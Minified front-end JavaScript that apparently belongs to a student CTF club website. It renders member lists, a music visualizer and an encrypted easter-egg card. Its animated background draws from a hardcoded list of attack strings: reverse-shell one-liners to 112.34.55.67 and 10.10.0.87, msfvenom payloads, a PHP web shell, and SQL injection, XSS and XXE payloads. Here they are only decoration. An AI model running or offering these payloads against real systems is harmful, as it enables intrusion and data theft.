var TKCTF=(()=>{var k=(e,t,n)=>new Promise((o,i)=>{var s=c=>{try{a(n.next(c))}catch(l){i(l)}},r=c=>{try{a(n.throw(c))}catch(l){i(l)}},a=c=>c.done?o(c.value):Promise.resolve(c.value).then(s,r);a((n=n.apply(e,t)).next())});function U(){let e=document.getElementById("dataStreams"),t=window.innerWidth<768,n=t?6:20,o=["0x4D5A90000300000004000000FFFF0000B800000000000000400000","GET /api/security HTTP/1.1",`POST /login HTTP/1.1
Content-Type: application/json`,`Connection: keep-alive
Authorization: Bearer eyJ0eXAi`,"SELECT * FROM users WHERE id = ?","UNION SELECT username,password FROM admin","INSERT INTO logs (timestamp, event) VALUES","nmap -sS -O target.com","hydra -l admin -P passwords.txt ssh://target","john --wordlist=rockyou.txt hash.txt",'sqlmap -u "http://target.com/login.php"',"python3 exploit.py --target 192.168.1.100","U2VjcmV0OiBCR00gT04gKyBkaXYgRm9vdGVyIOKGk+KGk+KGkw==","use exploit/multi/handler","set PAYLOAD windows/x64/meterpreter/reverse_tcp","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f elf -o reverse.elf","ncat.exe%20112.34.55.67%204444%20-e%20cmd","/bin/bash -i >& /dev/tcp/112.34.55.67/4444 0>&1","nc -lvnp 4444",'msfconsole -q -x "use exploit/multi/handler"','curl -X POST -d "username=admin&password=123"','wireshark -i eth0 -f "tcp port 80"',"tcpdump -i any -w capture.pcap","openssl s_client -connect target.com:443","ssh-keygen -t rsa -b 4096","gpg --gen-key --default-new-key-algo rsa4096","hashcat -a 0 -m 1000 hashes.txt wordlist.txt","aircrack-ng -w wordlist.txt capture.cap","dirb http://target.com/ /usr/share/wordlists/","gobuster dir -u http://target.com -w wordlist.txt",'<script>alert("XSS")<\/script>',"../../../../etc/passwd","{{7*7}}[[7*7]]",'<?php system($_GET["cmd"]); ?>','eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"))',"LDAP injection: *)(&(objectClass=*)",'XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',"' OR '1'='1' --","'; DROP TABLE users; --","' UNION SELECT NULL,username,password FROM admin --","1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --","masscan -p1-65535 --rate=1000 192.168.1.0/24","nmap -sV -sC -A target.com","nmap --script vuln target.com","nikto -h http://target.com","whatweb http://target.com","fierce -dns target.com","dnsrecon -d target.com -t brt","sublist3r -d target.com","medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt","crackmapexec smb 192.168.1.0/24 -u admin -p password123","wpscan --url http://target.com --enumerate u,p","use auxiliary/scanner/smb/smb_version","use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 192.168.1.100","exploit -j","search cve:2021-44228","use post/windows/gather/hashdump","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.87 LPORT=443 -f exe -o payload.exe","msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f raw > shell.php","msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f war > shell.war",`python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.0.87',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`,`php -r "$sock=fsockopen('10.10.0.87',4444);exec('/bin/sh -i <&3 >&3 2>&3');"`,`ruby -rsocket -e"f=TCPSocket.open('10.10.0.87',4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"`,`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.0.87',4444);"`,"ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//","arpspoof -i eth0 -t 192.168.1.100 192.168.1.1","responder -I eth0 -rdw","mitmdump -s script.py","hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a","john --format=NT hashes.txt","ophcrack -t tables/ -f hashes.txt","fcrackzip -D -p rockyou.txt archive.zip","airodump-ng wlan0mon","aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon","aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap","wifite --kill","kismet -c wlan0","ffuf -w wordlist.txt -u http://target.com/FUZZ","dirsearch -u http://target.com -e php,html,js","feroxbuster -u http://target.com -w wordlist.txt","wfuzz -w wordlist.txt http://target.com/FUZZ",'sqlmap -u "http://target.com/page.php?id=1" --dbs','sqlmap -u "http://target.com/page.php?id=1" --dump-all','sqlmap -u "http://target.com/page.php?id=1" --os-shell',"NoSQLMap -t mongodb://target.com:27017","setoolkit","gophish server --listen 0.0.0.0:3333","beef-xss","shellphish","mimikatz # sekurlsa::logonpasswords","bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all","winpeas.exe","linpeas.sh","privilege escalation: sudo -l","find / -perm -u=s -type f 2>/dev/null",'tshark -i eth0 -f "tcp port 80" -w capture.pcap',"tcpflow -i eth0 -c","dsniff -i eth0","urlsnarf -i eth0","volatility -f memory.dump imageinfo","autopsy case.db",'grep -r "error" /var/log/',"logstash -f config.conf","steghide embed -cf image.jpg -ef secret.txt","binwalk -e firmware.bin","strings binary | grep -i password","hexdump -C file.bin | head -20","burpsuite --config-file=config.json","postman collection run security-tests.json","owasp-zap-cli quick-scan --self-contained http://target.com",'curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token123"'];for(let i=0;i<n;i++){let s=document.createElement("div");s.className="data-stream";let r=o[Math.floor(Math.random()*o.length)];s.textContent=r;let a=Math.random()*window.innerWidth,c=t?(Math.random()-.5)*30:(Math.random()-.5)*100,l=Math.random()*8;s.style.left=a+"px",s.style.setProperty("--drift-x",c+"px"),s.style.animationDelay=`-${l}s`,e.appendChild(s)}it()}function it(){let e=document.getElementById("dataStreams"),t=8;for(let n=0;n<t;n++){let o=document.createElement("div");o.className="binary-stream";let i="";for(let a=0;a<80;a++)i+=Math.random()>.5?"1":"0",a%8===7&&(i+=" ");o.textContent=i;let s=Math.random()*window.innerHeight,r=Math.random()*20;o.style.top=s+"px",o.style.animationDelay=`-${r}s`,e.appendChild(o)}}function at(e){let t=document.querySelector(e);if(t){let n=document.querySelector("nav"),o=t.querySelector("h2"),i=n?n.offsetHeight:0,s=o?o.offsetHeight:0,r=i+s,c=t.getBoundingClientRect().top+window.pageYOffset-r;window.scrollTo({top:c,behavior:"smooth"})}}document.querySelectorAll('nav a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault(),at(this.getAttribute("href"))})});function J(){let e=window.innerHeight,t=e*.7,o=window.innerWidth<768?[".president-item",".president-members",".role-tag",".code-name"]:[".president-item",".contact-item","#friendsList",".president-members",".member-row",".role-tag",".code-name"];document.querySelectorAll(".content-section").forEach((s,r)=>{if(s.classList.contains("fade-in-visible"))return;let a=s.getBoundingClientRect().top,c=s.getBoundingClientRect().height,l=e*.85,d=c*.05;if(a<l-d&&a>-c){let T=r*100;setTimeout(()=>{s.style.opacity="1",s.style.transform="translateY(0)",s.classList.add("fade-in-visible"),s.style.transition="opacity 1.5s ease, transform 1.5s ease"},T)}}),o.forEach(s=>{document.querySelectorAll(s).forEach((a,c)=>{if(a.classList.contains("fade-in-visible"))return;let l=a.getBoundingClientRect().top,d=a.getBoundingClientRect().height,u=d*.05;if(l<e-u&&l>-d){let f=c*50;setTimeout(()=>{a.style.opacity="1",a.style.transform="translateY(0)",a.classList.add("fade-in-visible"),a.id},f)}})})}function rt(){let e=document.getElementById("backToTop"),t=document.querySelector("footer");if(!e)return;let n=window.pageYOffset||document.documentElement.scrollTop,o=t?t.getBoundingClientRect().top+window.pageYOffset:1/0,i=window.innerHeight,s=window.innerWidth<768,r=s?20:30,a=s?45:50;if(n>200)if(e.classList.add("show"),n+i-a-r+a+10>o){let l=n+i-o+10;e.style.bottom=l+"px"}else e.style.bottom=r+"px";else e.classList.remove("show")}function ct(){window.scrollTo({top:0,behavior:"smooth"})}function lt(){return k(this,null,function*(){try{let t=yield(yield fetch("./data/members.json")).json();mt(t.presidents),ut(t.members)}catch(e){console.error("\u52A0\u8F7D\u6210\u5458\u6570\u636E\u5931\u8D25:",e)}})}function dt(){return k(this,null,function*(){try{let t=yield(yield fetch("./data/friends.json")).json();pt(t.friends)}catch(e){console.error("\u52A0\u8F7D\u53CB\u94FE\u6570\u636E\u5931\u8D25:",e)}})}function mt(e){let t=document.getElementById("presidentsList");if(!t)return;let n=Object.keys(e).sort((o,i)=>o-i);t.innerHTML="",n.forEach((o,i)=>{let s=e[o];if(!s)return;let r=document.createElement("div");r.className="president-item",r.style.opacity="0",r.style.transform="translateY(30px)",r.style.transition="opacity 0.6s ease, transform 0.6s ease",r.style.animationDelay=`${i*300}ms`;let a=document.createElement("div");a.className="president-year",a.textContent=`${o}\u5C4A\u625B\u628A\u5B50`,r.appendChild(a);let c=document.createElement("div");c.className="president-names",r.appendChild(c);let l=document.createElement("div");if(l.className="achievements",l.innerHTML=s.achievements||"\u4E3B\u8981\u6210\u5C31\uFF1A\u6682\u65E0\u8BB0\u5F55",r.appendChild(l),!s.members||s.members.length===0){let d=document.createElement("span");d.className="unknown-member",d.innerHTML='> Error: Permission denied\uFF08\u7EC6\u8282\u6709\u5F85\u8003\u8BC1\uFF09<span class="blinking-cursor">_</span>',c.appendChild(d)}else{let d=document.createElement("div");d.className="president-members",d.style.opacity="0",d.style.transform="translateY(30px)",d.style.transition="opacity 0.6s ease, transform 0.6s ease",s.members.forEach((u,T)=>{let f=document.createElement("div");f.className="member-row",f.style.animationDelay=`${T*.1}s`,f.style.opacity="0",f.style.transform="translateY(30px)",f.style.transition="opacity 0.6s ease, transform 0.6s ease";let q=document.createElement("span");q.className="member-name",q.textContent=u.name,f.appendChild(q),u.roles.forEach(M=>{let x=document.createElement("span"),P;F(M)?P=ht(M):P=H(M),x.className=`role-tag ${P}`,x.textContent=M,x.style.opacity="0",x.style.transform="translateY(30px)",x.style.transition="opacity 0.6s ease, transform 0.6s ease",gt(u.roles)&&!F(M)&&wt(x,u.roles),f.appendChild(x)});let E=document.createElement("span");!u.codeName||u.codeName.trim()===""?(E.className="code-name null",E.textContent="Error: code-name not found"):(E.className="code-name",ft(E,u.codeName)),E.style.opacity="0",E.style.transform="translateY(30px)",E.style.transition="opacity 0.6s ease, transform 0.6s ease",f.appendChild(E),d.appendChild(f)}),c.appendChild(d)}t.appendChild(r)})}function ut(e){let t=document.getElementById("membersList");if(!t)return;let n=Object.keys(e).sort((o,i)=>i-o);t.innerHTML="",n.forEach((o,i)=>{let s=e[o];if(!s)return;let r=document.createElement("div");r.className="member-group";let a=document.createElement("div");a.className="member-year",a.textContent=`${o}\u5C4A`,r.appendChild(a);let c=document.createElement("div");c.className="member-list",s.length===0?c.textContent="\uFF08\u5F85\u8865\u5145\uFF09":c.textContent=s.join("\u3001"),r.appendChild(c),t.appendChild(r)})}function pt(e){let t=document.getElementById("friendsList");if(!t)return;let n=e.map(o=>`<a href="${o.url}" target="_blank">${o.name}</a>`);t.innerHTML=`<p>${n.join("\u3001")}</p>`,t.style.opacity="0",t.style.transform="translateY(30px)",t.style.transition="opacity 0.6s ease, transform 0.6s ease"}function ft(e,t){let n=t.includes("/")?t.split("/"):[t],o=0,i=!0,s="",a=window.innerWidth<768?6e3:3e3;function c(){let l=n[o].trim();i?s.length<l.length?(s=l.substring(0,s.length+1),e.textContent=s,setTimeout(c,100+Math.random()*100)):setTimeout(()=>{i=!1,c()},a):s.length>0?(s=s.substring(0,s.length-1),e.textContent=s,setTimeout(c,50)):(o=(o+1)%n.length,i=!0,setTimeout(c,200))}c()}function F(e){let t=e.toLowerCase();return t.includes("\u5E73\u53F0\u603B\u76D1")||t.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")}function H(e){let t=e.toLowerCase();return t.includes("\u6280\u672F")||t.includes("\u653B\u9632")?"tech":t.includes("\u884C\u653F\u8FD0\u8425")?"admin":t.includes("\u7ADE\u8D5B")?"competition":t.includes("\u5BA3\u4F20")?"promotion":"default"}function ht(e){let t=e.toLowerCase();return t.includes("\u5E73\u53F0\u603B\u76D1")?"director":t.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")?"teacher":"default"}function gt(e){let t=e.filter(o=>!F(o)),n=new Set;return t.forEach(o=>{if(o.includes("/"))o.split("/").forEach(s=>{let r=H(s.trim());n.add(r)});else{let i=H(o);n.add(i)}}),n.size>1}function yt(e){let t={tech:"#4a36ff",admin:"#11ffff",competition:"#ffbe32",promotion:"#ff9ff3",default:"#39b8eb"},n=new Set;return e.filter(i=>!F(i)).forEach(i=>{if(i.includes("/"))i.split("/").forEach(r=>{let a=H(r.trim());n.add(t[a])});else{let s=H(i);n.add(t[s])}}),Array.from(n)}function wt(e,t){let n=yt(t);if(n.length<=1)return;let o=n.map((i,s)=>{let r=s/(n.length-1)*100;return`${i} ${r}%`}).join(", ");e.style.background=`linear-gradient(135deg, ${o})`,e.style.border="1px solid rgba(255, 255, 255, 0.4)",e.style.boxShadow="0 0 20px rgba(255, 255, 255, 0.5)"}document.addEventListener("DOMContentLoaded",function(){U(),[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(s=>{document.querySelectorAll(s).forEach(a=>{a.style.opacity="0",a.style.transform="translateY(30px)",a.style.transition="opacity 0.6s ease, transform 0.6s ease"})}),J(),lt(),dt();let t=document.querySelector(".about-title");t&&setTimeout(()=>{t.classList.add("loaded")},100);let n=document.getElementById("backToTop");n&&n.addEventListener("click",ct);let i="ontouchstart"in window||navigator.maxTouchPoints>0?20:150});var bt=0;var I=!1,w=0,Q=1,j=!1,D=!1;function vt(){let e=document.getElementById("mainFooter");if(!e||I)return;let t=document.getElementById("bgmAudio");if(!t||t.paused)return;let n=window.pageYOffset||document.documentElement.scrollTop,o=e.offsetTop,i=window.innerHeight,s=document.documentElement.scrollHeight,r=n+i>=s-1,a=n+i>=o+e.offsetHeight;r&&a&&xt()}function Et(e){let t=document.getElementById("mainFooter");if(!t)return;let n=document.getElementById("bgmAudio");if(!n||n.paused)return;let o=window.pageYOffset||document.documentElement.scrollTop,i=t.offsetTop,s=window.innerHeight,r=document.documentElement.scrollHeight,a=o+s>=r-1,c=o+s>=i+t.offsetHeight;a&&c&&(e.deltaY>0?I||(e.preventDefault(),Z(0)):e.deltaY<0&&(I?(e.preventDefault(),nt()):w>0&&(e.preventDefault(),tt())))}function Tt(e){let t=document.getElementById("particleContainer");if(!t)return;let n=Math.min(5+e*2,30);for(let o=0;o<n;o++){let i=document.createElement("div");i.className="particle",i.style.left=Math.random()*100+"%",i.style.animationDelay=Math.random()*2+"s",i.style.animationDuration=2+Math.random()*2+"s";let s=2+e*.5;i.style.width=s+"px",i.style.height=s+"px";let r=.5+e*.05;i.style.boxShadow=`0 0 ${10+e}px #00e4ff, 0 0 ${20+e*2}px #00e4ff, 0 0 ${30+e*3}px #00e4ff`,t.appendChild(i),setTimeout(()=>{i.parentNode&&i.parentNode.removeChild(i)},3e3)}}function xt(){j||(j=!0,Tt(1),et(),setTimeout(()=>{j=!1},100))}function Z(e){if(!document.getElementById("mainFooter"))return;D&&(w=0,D=!1),et(),w++;let o="ontouchstart"in window||navigator.maxTouchPoints>0?20:150;w>=o?Bt():w/o>=.8&&Ct()}function tt(){let e=document.getElementById("mainFooter");if(!e)return;Q=1,e.style.borderTopWidth="1px",w=0,D=!0,document.querySelectorAll(".bottom-glow, .persistent-glow").forEach(n=>n.remove())}function et(){let e=document.createElement("div");e.className="bottom-glow";let t=window.innerWidth<768,o="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,i=Math.min(w/o,1),s=t?15:20,a=s+(135-s)*i,c=t?.5:.6,d=c+(.9-c)*i;e.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${a}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${d}), transparent);
        z-index: 1000;
        will-change: opacity, transform;
        animation: glowPulse 0.5s ease-out;
        pointer-events: none;
    `,document.body.appendChild(e),setTimeout(()=>{e.parentNode&&e.parentNode.removeChild(e)},500)}function Ct(){let e=document.getElementById("persistentGlow");e&&e.remove();let t=document.createElement("div");t.id="persistentGlow",t.className="persistent-glow";let n=window.innerWidth<768,i="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,s=Math.min(w/i,1),r=n?15:20,c=r+((n?60:80)-r)*s,l=n?.4:.6,u=l+(.9-l)*s;t.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${c}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${u}), transparent);
        z-index: 999;
        will-change: opacity, transform;
        animation: persistentGlow 2s ease-in-out infinite;
        pointer-events: none;
    `,document.body.appendChild(t)}function Bt(){I=!0;let e=document.getElementById("easterEgg"),t=document.getElementById("mainFooter");e&&(t&&(t.style.display="none"),It(),e.classList.add("show"),e.scrollIntoView({behavior:"smooth"}))}function Lt(){let e=["IUAj","S2V5","U2VjcmV0","MjAyNQ==","Q1RG","VEs="],t=Object.assign({},{"!":"A","@":"B","#":"C",T:"D",K:"E",C:"F",F:"G",2:"H",0:"I",5:"J",S:"K",e:"L",c:"M",r:"N",t:"O"},{K:"P",e:"Q",y:"R","!":"S","@":"T"}),n=[];for(let r of e)n.push(atob(r));let o=n.join(""),i={};for(let[r,a]of Object.entries(t))i[a]=r;let s="";for(let r of o)s+=i[r]||r;return s}function St(e){try{let t=Lt(),o=CryptoJS.AES.decrypt(e,t).toString(CryptoJS.enc.Utf8);if(!o)throw new Error("\u89E3\u5BC6\u5931\u8D25\u6216\u5BC6\u94A5\u9519\u8BEF");return o}catch(t){throw console.error("\u89E3\u5BC6\u5931\u8D25:",t),t}}function It(){return k(this,null,function*(){let e=document.getElementById("cardContent");if(e)try{let t=yield fetch("./data/Card.encrypted");if(!t.ok)throw new Error("Failed to load encrypted card content");let n=yield t.text(),o=St(n);e.innerHTML=o,V()}catch(t){console.error("\u52A0\u8F7D\u6216\u89E3\u5BC6\u5361\u7247\u5185\u5BB9\u5931\u8D25:",t),e.innerHTML='<div class="card-container" id="cardContainer"><div class="card" id="card"><div class="card-front"><img src="./img/TKCTF512.svg" alt="TKCTF Logo" class="card-logo"></div><div class="card-back"><div class="card-content"><h4>\u5173\u4E8E\u672C\u7F51\u7AD9</h4><p>\u5185\u5BB9\u52A0\u8F7D\u5931\u8D25</p></div></div></div></div>',V()}})}function nt(){I=!1,bt=0,w=0,Q=1,D=!1;let t="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,n=document.getElementById("easterEgg"),o=document.getElementById("mainFooter");if(!n)return;n.classList.remove("show");let i=document.getElementById("cardContent");i&&(i.innerHTML="");let s=document.getElementById("persistentGlow");s&&s.remove(),o&&(o.style.display="",o.style.borderTopWidth="1px"),o&&o.scrollIntoView({behavior:"smooth"})}function V(){let e=document.getElementById("card");e&&e.addEventListener("click",function(){e.classList.contains("flipped")?e.classList.remove("flipped"):e.classList.add("flipped")})}window.addEventListener("scroll",()=>{rt(),J(),vt()});window.addEventListener("wheel",Et,{passive:!1});var N=0,A=0;window.addEventListener("touchstart",function(e){N=e.touches[0].clientY},{passive:!0});window.addEventListener("touchend",function(e){if(A=e.changedTouches[0].clientY,I){N<A&&nt();return}let t=document.getElementById("bgmAudio");if(!t||t.paused)return;let n=document.getElementById("mainFooter");if(!n)return;let o=window.pageYOffset||document.documentElement.scrollTop,i=n.offsetTop,s=window.innerHeight,r=document.documentElement.scrollHeight,a=o+s>=r-1,c=o+s>=i+n.offsetHeight;a&&c&&(N>A?Z(0):N<A&&w>0&&tt())},{passive:!0});var h=!1,b=null,p=null,g=null,v=[];var z=0,m=null,_=null,y=null,B=!1,Y=0,$=0,O=0,R=0,K=0,L=[],C=!1;function Mt(){try{b=new(window.AudioContext||window.webkitAudioContext);let e=document.getElementById("bgmAudio"),t=b.createMediaElementSource(e);p=b.createAnalyser(),p.fftSize=2048,p.smoothingTimeConstant=.8;let n=p.frequencyBinCount;return g=new Uint8Array(n),t.connect(p),p.connect(b.destination),!0}catch(e){return!1}}function Ht(){let e=document.getElementById("logo");fetch("./img/TKCTF512.svg").then(t=>t.text()).then(t=>{if(e.innerHTML=t,m=e.querySelector("svg"),m){m.id="logoSvg",m.style.width="100%",m.style.height="100%";let n=m.viewBox.baseVal,o=n.width||1e3;_={T0:m.querySelector(".T0"),K:m.querySelector(".K"),C:m.querySelector(".C"),T1:m.querySelector(".T1"),F:m.querySelector(".F")};let i=m.querySelector("defs");i||(i=document.createElementNS("http://www.w3.org/2000/svg","defs"),m.insertBefore(i,m.firstChild));let s=document.createElementNS("http://www.w3.org/2000/svg","clipPath");s.id="progressClip",y=document.createElementNS("http://www.w3.org/2000/svg","rect"),y.setAttribute("x","0"),y.setAttribute("y","0"),y.setAttribute("width","0"),y.setAttribute("height",n.height||1e3),s.appendChild(y),i.appendChild(s);let r=document.createElementNS("http://www.w3.org/2000/svg","g");r.id="progressGroup",r.setAttribute("clip-path","url(#progressClip)"),Object.values(_).forEach(a=>{if(a){a.style.fill="#010101";let c=a.cloneNode(!0);c.style.fill="#00a2ff",c.style.filter="drop-shadow(0 0 8px rgba(0, 162, 255, 0.8))",r.appendChild(c)}}),m.appendChild(r)}}).catch(t=>console.error("\u52A0\u8F7DSVG\u5931\u8D25:",t))}function kt(){let e=document.getElementById("logoContainer");e.addEventListener("mousemove",n=>{let o=e.getBoundingClientRect(),i=o.left+o.width/2,s=o.top+o.height/2;Y=(n.clientX-i)/10,$=(n.clientY-s)/10}),e.addEventListener("mouseleave",()=>{Y=0,$=0});function t(){if(O+=(Y-O)*.15,R+=($-R)*.15,!B&&Math.abs(O)>.1||Math.abs(R)>.1){let n=document.getElementById("logo");(n.style.transform||"").includes("scale")||(n.style.transform=`translate(${O}px, ${R}px)`)}requestAnimationFrame(t)}t()}function G(e){if(!m)return;let t=document.getElementById("logoContainer"),n=document.createElement("div");n.className="trail-particle";let o=m.cloneNode(!0);o.style.width="100%",o.style.height="100%",o.style.transform=`rotate(${e}deg)`,o.style.filter="drop-shadow(0 0 20px rgba(0, 255, 255, 0.9)) brightness(1.3)",n.appendChild(o),t.appendChild(n),setTimeout(()=>{n.style.opacity="0.6",n.style.transition="opacity 0.1s ease-out"},10),setTimeout(()=>{n.style.opacity="0",n.style.transition="opacity 0.3s ease-out"},100),setTimeout(()=>{n.remove()},400)}function At(e){let t=document.getElementById("logoContainer"),n=document.createElement("div");n.className="pulse-ring",n.style.width="120px",n.style.height="120px",n.style.border=`${3+e*2}px solid rgba(0, 255, 255, ${.9})`,n.style.boxShadow="0 0 30px rgba(0, 255, 255, 0.8), inset 0 0 30px rgba(0, 162, 255, 0.5)",n.style.animation="beatPulse 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards",t.appendChild(n),setTimeout(()=>n.remove(),220)}function Ot(){let e=document.getElementById("logoContainer"),t=document.createElement("div");t.className="wave-ring",t.style.width="120px",t.style.height="120px",e.appendChild(t),setTimeout(()=>t.remove(),320)}function Rt(){if(!p||!g||!h)return;p.getByteFrequencyData(g);let t=g.reduce((s,r)=>s+r)/g.length/255,o=5+t*12,i=(Math.random()-.5)*(1+t*8);if(!C&&!B){let s=document.getElementById("logo"),r=(Math.random()-.5)*o,a=(Math.random()-.5)*o;s.style.transform=`translate(${r}px, ${a}px) rotate(${i}deg)`;let l=25+t*25,d=.6+t*.4;s.style.filter=`drop-shadow(0 0 ${l}px rgba(0, 162, 255, ${d}))`,t>.25&&Math.random()>.75&&G(i)}}function W(e,t,n){return Math.round(e/(t/2)*(n/2))}function Nt(){if(!p||!g)return!1;p.getByteFrequencyData(g);let e=b.sampleRate,t=W(1500,e,p.fftSize),n=W(2250,e,p.fftSize),o=0,i=Math.max(1,n-t+1);for(let c=t;c<=n&&c<g.length;c++)o+=g[c];let s=o/i,r=188,a=Date.now();return s>r&&a-z>25?(z=a,!0):!1}function Ft(){if(!v.length)return!1;let e=Date.now(),t=v.length,n=Math.floor(t*.2),o=Math.floor(t*.25),i=v.slice(n,o),s=0;i.forEach(l=>{l.classList.contains("active")&&s++});let r=Math.max(1,Math.ceil(i.length/2)),a=s>=r;return L.push({time:e,isActive:a}),L=L.filter(l=>e-l.time<=20),L.filter(l=>l.isActive).length>0&&e-K>120?(K=e,!0):!1}function Dt(){let e=document.getElementById("bgmAudio");if(!e.duration||!y||!m)return;let t=e.currentTime/e.duration,o=m.viewBox.baseVal.width||1e3;y.setAttribute("width",o*t)}function X(){let e=document.getElementById("binarySpectrum"),t=Math.floor(window.innerWidth/12);e.innerHTML="",v=[];for(let n=0;n<t;n++){let o=document.createElement("div");o.className="spectrum-bar",o.style.left=n*(100/t)+"%",o.style.height="0px";let i=document.createElement("div");i.className="binary-digits";let s="",r=Math.floor(Math.random()*12)+8;for(let a=0;a<r;a++)s+=Math.random()>.5?"1":"0";i.textContent=s,o.appendChild(i),e.appendChild(o),v.push(o)}}function ot(){if(!p||!h)return;p.getByteFrequencyData(g);let e=b.sampleRate,t=document.getElementById("dataStreams"),n=document.getElementById("logoContainer"),o=document.getElementById("logo");h&&(t.classList.remove("glitch-beat"),t.classList.add("glitch-subtle"));let i=Ft(),s=Nt();i&&!C?(C=!0,n.classList.add("heavy-beats"),n.classList.add("activity"),Ot(),[-12,-8,-4,0,4,8,12].forEach((a,c)=>{setTimeout(()=>G(a),c*20)}),setTimeout(()=>{C=!1,n.classList.remove("heavy-beats"),n.classList.remove("activity")},200)):s&&!B&&!C&&(B=!0,n.classList.add("activity"),o.style.animation="beatScale 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards",[-8,-4,0,4,8].forEach((a,c)=>{setTimeout(()=>G(a),c*30)}),At(1),setTimeout(()=>{B=!1,o.style.animation="",n.classList.remove("activity")},400),t.classList.remove("glitch-subtle"),t.classList.add("glitch-beat"),setTimeout(()=>{h&&(t.classList.remove("glitch-beat"),t.classList.add("glitch-subtle"))},250)),Rt(),qt(g),Dt(),h&&requestAnimationFrame(ot)}function qt(e){if(!v.length)return;let t=v.length,n=Math.floor(e.length*.85),o=Math.floor(n/t);for(let i=0;i<t;i++){let s=i*o,r=e[s]||0,a=Math.max(5,r/255*100),c=v[i];if(c.classList.remove("stopping"),c.style.height=a+"px",r>140?c.classList.add("active"):c.classList.remove("active"),Math.random()>.92){let l=c.querySelector(".binary-digits"),d="",u=Math.floor(Math.random()*12)+8;for(let T=0;T<u;T++)d+=Math.random()>.5?"1":"0";l.textContent=d}}}function st(){document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),v.forEach((t,n)=>{t.classList.add("stopping"),t.classList.remove("active"),setTimeout(()=>{t.style.height="0px",setTimeout(()=>{let o=t.querySelector(".binary-digits");o&&(o.textContent="")},400)},n*20)})}function S(e){let t=document.getElementById("audioStatus");switch(t.classList.remove("blink","show","hidden"),e){case"initial":t.textContent="\u70B9\u51FB LOGO \u64AD\u653E BGM",t.classList.add("blink");break;case"playing":t.classList.add("hidden");break;case"paused":t.textContent="\u70B9\u51FB LOGO \u7EE7\u7EED\u64AD\u653E",t.classList.add("show");break;default:t.classList.add("hidden")}}function Pt(){let e=document.getElementById("bgmAudio"),t=document.getElementById("logoContainer"),n=document.getElementById("logo");if(h)h=!1,e.pause(),t.classList.remove("playing","activity","heavy-beats"),S("paused"),n.style.transform="",n.style.animation="",B=!1,C=!1,L=[],requestAnimationFrame(()=>{st()});else{if(!b&&!Mt()){S("initial");return}b.state==="suspended"&&b.resume(),e.play().then(()=>{h=!0,t.classList.add("playing"),S("playing"),document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),ot()}).catch(o=>{S("initial")})}}function jt(){let e=document.getElementById("logoContainer"),t=document.getElementById("logo");h=!1,e.classList.remove("playing","activity","heavy-beats"),t.style.transform="",t.style.animation="",B=!1,C=!1,L=[],y&&y.setAttribute("width","0"),requestAnimationFrame(()=>{st()}),S("initial")}document.addEventListener("DOMContentLoaded",function(){U(),X();let e;window.addEventListener("resize",()=>{clearTimeout(e),e=setTimeout(()=>{X()},300)});let t=document.getElementById("logoContainer"),n=document.getElementById("bgmAudio");t&&n&&(Ht(),kt(),t.addEventListener("click",Pt),n.addEventListener("ended",jt),S("initial")),n&&(n.volume=1,n.loop=!0)});document.addEventListener("visibilitychange",function(){let e=document.getElementById("bgmAudio");if(document.hidden&&h){let t=e.volume,n=.15,o=600,i=20,s=(t-n)/i,r=o/i,a=0,c=setInterval(()=>{a++,e.volume=Math.max(n,t-s*a),a>=i&&(clearInterval(c),e.volume=n)},r)}else if(!document.hidden&&h){let t=e.volume,n=1,o=350,i=20,s=(n-t)/i,r=o/i,a=0,c=setInterval(()=>{a++,e.volume=Math.min(n,t+s*a),a>=i&&(clearInterval(c),e.volume=n)},r)}});})();
